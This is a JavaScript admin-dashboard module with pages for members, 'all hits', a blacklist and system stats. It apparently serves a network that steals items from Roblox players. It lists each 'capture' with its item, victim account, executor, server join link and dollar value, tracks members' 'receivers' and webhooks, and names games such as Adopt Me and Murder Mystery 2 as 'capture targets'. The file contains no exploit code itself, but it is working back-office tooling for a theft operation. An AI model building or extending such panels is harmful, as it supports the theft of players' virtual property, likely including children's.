import { api } from './api.js';
import { icon, esc, nf, money, timeAgo, stamp, avatar, toast, modal, duration } from './ui.js';

const head = (title, subtitle) => `
  <div class="page-head">
    <div class="titles">
      <div class="eyebrow">Admin</div>
      <h1>${esc(title)}</h1>
      <p>${esc(subtitle)}</p>
    </div>
  </div>`;

const emptyState = (title, hint) => `
  <div class="empty">${icon('shield', 22)}<strong>${esc(title)}</strong><span>${esc(hint)}</span></div>`;

const pagerHtml = (res) => `
  <span>${nf(res.total)} total · page ${res.page} of ${res.pages}</span>
  <div class="right">
    <button class="btn btn-sm" data-page="${res.page - 1}" ${res.page <= 1 ? 'disabled' : ''}>Prev</button>
    <button class="btn btn-sm" data-page="${res.page + 1}" ${res.page >= res.pages ? 'disabled' : ''}>Next</button>
  </div>`;

const joinLink = (url) => (url
  ? `<a class="btn btn-sm btn-join" href="${esc(url)}" target="_blank" rel="noopener noreferrer">${icon('external', 11)} Join</a>`
  : '<span class="cell-sub">—</span>');

const guard = async (root, ctx) => {
  if (ctx.user.role !== 'admin') {
    root.innerHTML = `<div class="card">${emptyState('Administrator privileges are required to view this page.', 'Ask an admin to promote your account.')}</div>`;
    return false;
  }
  return true;
};

/* ============================ members ============================ */
export async function members(root, ctx) {
  root.innerHTML = `${head('Members', 'Every account on the network. Ban, unban and promote from here.')}
    <div class="card">
      <div class="toolbar">
        <div style="position:relative">
          <input class="input" id="q" placeholder="Search members…" style="padding-left:31px;width:220px" />
          <span style="position:absolute;left:9px;top:9px;color:var(--faint)">${icon('search', 14)}</span>
        </div>
        <div class="spacer"></div>
        <button class="btn btn-sm" id="refresh">${icon('refresh', 13)} Refresh</button>
      </div>
      <div class="table-wrap"><table>
        <thead><tr>
          <th>Member</th><th>Role</th><th class="num">Hits</th><th class="num">Receivers</th>
          <th>Webhook</th><th>Joined</th><th>Last seen</th><th class="num">Actions</th>
        </tr></thead>
        <tbody id="rows"><tr><td colspan="8"><div class="skeleton" style="height:170px"></div></td></tr></tbody>
      </table></div>
      <div class="pager" id="pager"></div>
    </div>`;

  if (!(await guard(root, ctx))) return () => {};

  const state = { search: '', page: 1 };

  const load = async () => {
    const res = await api.adminUsers(state);
    root.querySelector('#rows').innerHTML = res.rows.length
      ? res.rows.map((u) => `
        <tr>
          <td>
            <div class="cell-row">
              ${avatar(u, 22)}
              <span>${esc(u.username)}</span>
              ${u.banned ? '<span class="badge banned">Banned</span>' : ''}
            </div>
            ${u.banned && u.ban_reason ? `<div class="cell-sub">${esc(u.ban_reason)}</div>` : ''}
          </td>
          <td><span class="badge ${u.role === 'admin' ? 'admin' : 'game'}">${esc(u.role)}</span></td>
          <td class="num">${nf(u.hits)}</td>
          <td class="num">${nf(u.receivers)}</td>
          <td>${u.webhook_set ? '<span class="badge claimed">set</span>' : '<span class="cell-sub">none</span>'}</td>
          <td class="cell-sub">${stamp(u.created_at)}</td>
          <td class="cell-sub">${timeAgo(u.last_seen)} ago</td>
          <td class="num" style="white-space:nowrap">
            <button class="btn btn-sm ${u.banned ? '' : 'btn-danger'}" data-ban="${esc(u.id)}" data-banned="${u.banned ? 1 : 0}">
              ${icon(u.banned ? 'check' : 'ban', 12)} ${u.banned ? 'Unban' : 'Ban'}
            </button>
            <button class="btn btn-sm btn-ghost" data-role="${esc(u.id)}" data-current="${esc(u.role)}">
              ${u.role === 'admin' ? 'Demote' : 'Promote'}
            </button>
          </td>
        </tr>`).join('')
      : `<tr><td colspan="8">${emptyState('No members match that search.', 'Try a different username.')}</td></tr>`;
    root.querySelector('#pager').innerHTML = pagerHtml(res);
  };

  root.querySelector('#pager').addEventListener('click', (e) => {
    const btn = e.target.closest('[data-page]');
    if (!btn || btn.disabled) return;
    state.page = Number(btn.dataset.page);
    load();
  });
  root.querySelector('#refresh').addEventListener('click', load);

  let timer;
  root.querySelector('#q').addEventListener('input', (e) => {
    state.search = e.target.value;
    state.page = 1;
    clearTimeout(timer);
    timer = setTimeout(load, 220);
  });

  root.querySelector('#rows').addEventListener('click', async (e) => {
    const banBtn = e.target.closest('[data-ban]');
    if (banBtn) {
      if (banBtn.dataset.banned === '1') {
        await api.adminUpdateUser(banBtn.dataset.ban, { banned: false });
        toast('Member unbanned');
        load();
        return;
      }
      const result = await modal({
        title: 'Ban this member?',
        description: 'They will lose dashboard access immediately.',
        tone: 'danger',
        confirmText: 'Ban member',
        body: `<div class="field"><label>Reason</label><input class="input" name="reason" placeholder="Optional reason" /></div>`,
        onSubmit: async (data) => {
          await api.adminUpdateUser(banBtn.dataset.ban, { banned: true, reason: data.reason });
        },
      });
      if (result) { toast('Member banned'); load(); }
      return;
    }

    const roleBtn = e.target.closest('[data-role]');
    if (roleBtn) {
      const next = roleBtn.dataset.current === 'admin' ? 'member' : 'admin';
      await api.adminUpdateUser(roleBtn.dataset.role, { role: next });
      toast(`Role set to ${next}`);
      load();
    }
  });

  await load();
  return () => {};
}

/* ============================ all hits ============================ */
export async function adminHits(root, ctx) {
  root.innerHTML = `${head('All hits', 'Every capture network-wide, with executor and the server it came from.')}
    <div class="card">
      <div class="toolbar">
        <div style="position:relative">
          <input class="input" id="q" placeholder="Search item, victim, member…" style="padding-left:31px;width:250px" />
          <span style="position:absolute;left:9px;top:9px;color:var(--faint)">${icon('search', 14)}</span>
        </div>
        <select class="select" id="game" style="width:auto">
          <option value="all">All games</option>
          <option value="mm2">Murder Mystery 2</option>
          <option value="adm">Adopt Me</option>
          <option value="baddies">Baddies</option>
          <option value="gag2">Grow a Garden 2</option>
          <option value="sab">Steal a Brainrot</option>
        </select>
        <select class="select" id="range" style="width:auto">
          <option value="all">All time</option>
          <option value="24h">Last 24 hours</option>
          <option value="7d">Last 7 days</option>
        </select>
        <div class="spacer"></div>
        <span class="badge game" id="count"></span>
      </div>
      <div class="table-wrap"><table>
        <thead><tr><th>Item</th><th>Game</th><th>Member</th><th>Roblox</th><th>Executor</th>
          <th>Server</th><th class="num">Value</th><th>Status</th><th>Time</th><th class="num"></th></tr></thead>
        <tbody id="rows"><tr><td colspan="10"><div class="skeleton" style="height:170px"></div></td></tr></tbody>
      </table></div>
      <div class="pager" id="pager"></div>
    </div>`;

  if (!(await guard(root, ctx))) return () => {};

  const state = { search: '', game: 'all', range: 'all', page: 1 };

  const load = async () => {
    const res = await api.adminHits(state);
    root.querySelector('#rows').innerHTML = res.rows.length
      ? res.rows.map((h) => `
        <tr>
          <td class="cell-item">${esc(h.item)}</td>
          <td><span class="badge game">${esc(h.game)}</span></td>
          <td class="cell-sub">${esc(h.username)}</td>
          <td class="cell-sub">${esc(h.roblox_user ?? '—')}</td>
          <td>${h.executor ? `<span class="badge executor">${esc(h.executor)}</span>` : '<span class="cell-sub">—</span>'}</td>
          <td>${joinLink(h.server_url)}</td>
          <td class="num">${money(h.value)}</td>
          <td><span class="badge ${esc(h.status)}">${esc(h.status)}</span></td>
          <td class="cell-sub" title="${esc(stamp(h.created_at))}">${timeAgo(h.created_at)} ago</td>
          <td class="num"><button class="btn btn-sm btn-ghost" data-del="${esc(h.id)}" title="Delete">${icon('trash', 13)}</button></td>
        </tr>`).join('')
      : `<tr><td colspan="10">${emptyState('No hits recorded for this filter.', 'Nothing matched.')}</td></tr>`;
    root.querySelector('#count').textContent = `${nf(res.total)} hits`;
    root.querySelector('#pager').innerHTML = pagerHtml(res);
  };

  root.querySelector('#pager').addEventListener('click', (e) => {
    const btn = e.target.closest('[data-page]');
    if (!btn || btn.disabled) return;
    state.page = Number(btn.dataset.page);
    load();
  });

  let timer;
  root.querySelector('#q').addEventListener('input', (e) => {
    state.search = e.target.value;
    state.page = 1;
    clearTimeout(timer);
    timer = setTimeout(load, 220);
  });
  root.querySelector('#game').addEventListener('change', (e) => { state.game = e.target.value; state.page = 1; load(); });
  root.querySelector('#range').addEventListener('change', (e) => { state.range = e.target.value; state.page = 1; load(); });

  root.querySelector('#rows').addEventListener('click', async (e) => {
    const btn = e.target.closest('[data-del]');
    if (!btn) return;
    await api.adminDeleteHit(btn.dataset.del);
    toast('Hit deleted');
    load();
  });

  await load();
  return () => {};
}

/* ============================ blacklist ============================ */
export async function blacklist(root, ctx) {
  root.innerHTML = `${head('Blacklist', 'Blocked usernames are ignored at ingest.')}
    <div class="card">
      <div class="card-head"><div><h2>Add to blacklist</h2><p>Hits from this Roblox username will be ignored.</p></div></div>
      <div class="card-body" style="display:flex;gap:8px;flex-wrap:wrap">
        <input class="input" id="username" placeholder="Roblox username" style="flex:1;min-width:170px" />
        <input class="input" id="reason" placeholder="Optional reason" style="flex:1;min-width:170px" />
        <button class="btn btn-primary" id="add">${icon('plus', 13)} Add entry</button>
      </div>
    </div>
    <div class="card" style="margin-top:12px">
      <div class="toolbar">
        <div style="position:relative">
          <input class="input" id="q" placeholder="Search blacklist…" style="padding-left:31px;width:220px" />
          <span style="position:absolute;left:9px;top:9px;color:var(--faint)">${icon('search', 14)}</span>
        </div>
        <div class="spacer"></div>
        <span class="badge game" id="count"></span>
      </div>
      <div class="table-wrap"><table>
        <thead><tr><th>Username</th><th>Reason</th><th>Added by</th><th>Added</th><th class="num"></th></tr></thead>
        <tbody id="rows"><tr><td colspan="5"><div class="skeleton" style="height:130px"></div></td></tr></tbody>
      </table></div>
      <div class="pager" id="pager"></div>
    </div>`;

  if (!(await guard(root, ctx))) return () => {};

  const state = { search: '', page: 1 };

  const load = async () => {
    const res = await api.adminBlacklist(state);
    root.querySelector('#rows').innerHTML = res.rows.length
      ? res.rows.map((b) => `
        <tr>
          <td class="cell-item">${esc(b.username)}</td>
          <td class="cell-sub">${esc(b.reason)}</td>
          <td class="cell-sub">${esc(b.added_by)}</td>
          <td class="cell-sub">${stamp(b.created_at)}</td>
          <td class="num"><button class="btn btn-sm btn-ghost" data-del="${esc(b.id)}" title="Remove">${icon('trash', 13)}</button></td>
        </tr>`).join('')
      : `<tr><td colspan="5">${emptyState('Blacklist is empty.', 'Blocked usernames will appear here.')}</td></tr>`;
    root.querySelector('#count').textContent = `${nf(res.total)} entries`;
    root.querySelector('#pager').innerHTML = pagerHtml(res);
  };

  const add = async () => {
    const username = root.querySelector('#username').value.trim();
    const reason = root.querySelector('#reason').value.trim();
    if (!username) return toast('Roblox username is required', 'error');
    try {
      await api.adminAddBlacklist({ username, reason });
      root.querySelector('#username').value = '';
      root.querySelector('#reason').value = '';
      toast('Entry added');
      load();
    } catch (err) {
      toast(err.message, 'error');
    }
  };

  root.querySelector('#add').addEventListener('click', add);
  root.querySelector('#username').addEventListener('keydown', (e) => { if (e.key === 'Enter') add(); });

  let timer;
  root.querySelector('#q').addEventListener('input', (e) => {
    state.search = e.target.value;
    state.page = 1;
    clearTimeout(timer);
    timer = setTimeout(load, 220);
  });
  root.querySelector('#pager').addEventListener('click', (e) => {
    const btn = e.target.closest('[data-page]');
    if (!btn || btn.disabled) return;
    state.page = Number(btn.dataset.page);
    load();
  });
  root.querySelector('#rows').addEventListener('click', async (e) => {
    const btn = e.target.closest('[data-del]');
    if (!btn) return;
    await api.adminRemoveBlacklist(btn.dataset.del);
    toast('Entry removed');
    load();
  });

  await load();
  return () => {};
}

/* ============================ system ============================ */
export async function system(root, ctx) {
  root.innerHTML = `${head('System', 'Instance health, storage and delivery configuration.')}
    <div class="stat-grid" id="cards"></div>
    <div class="grid-2" style="margin-top:12px">
      <div class="card">
        <div class="card-head"><div><h2>Runtime</h2><p>Live from this process.</p></div>
          <div class="right"><button class="btn btn-sm" id="refresh">${icon('refresh', 13)} Refresh</button></div>
        </div>
        <div class="card-body"><div class="kv" id="runtime"></div></div>
      </div>
      <div class="card">
        <div class="card-head"><div><h2>Games</h2><p>Recognized capture targets.</p></div></div>
        <div class="card-body"><div class="kv" id="games"></div></div>
      </div>
    </div>`;

  if (!(await guard(root, ctx))) return () => {};

  const load = async () => {
    const s = await api.adminSystem();
    root.querySelector('#cards').innerHTML = [
      ['Uptime', duration(s.uptime), 'var(--accent)', 'radio'],
      ['Hits today', nf(s.hits_today), 'var(--success)', 'hits'],
      ['Total hits', nf(s.total_hits), 'var(--info)', 'coin'],
      ['Database', s.db_size_human, 'var(--purple)', 'cpu'],
    ].map(([label, value, tone, iconName]) => `
      <div class="stat" style="--tone:${tone}">
        <div class="stat-top"><span class="stat-icon">${icon(iconName, 15)}</span><span class="stat-label">${esc(label)}</span></div>
        <div class="stat-value">${esc(value)}</div>
      </div>`).join('');

    root.querySelector('#runtime').innerHTML = [
      ['Members', nf(s.total_users)],
      ['Online', nf(s.online)],
      ['Active receivers', nf(s.active_receivers)],
      ['Banned', nf(s.banned)],
      ['Blacklisted', nf(s.blacklisted)],
      ['Discord OAuth', s.discord_oauth ? 'configured' : 'demo mode'],
      ['Node', s.node],
      ['DB size', `${nf(s.db_size)} B`],
    ].map(([k, v]) => `<div><span>${esc(k)}</span><b>${esc(v)}</b></div>`).join('');

    root.querySelector('#games').innerHTML = s.games
      .map((g) => `<div><span>${esc(g.name)}</span><b>${esc(g.id)}</b></div>`).join('');
  };

  root.querySelector('#refresh').addEventListener('click', () => { load(); toast('System stats refreshed', 'info'); });
  await load();
  const timer = setInterval(load, 15000);
  return () => clearInterval(timer);
}
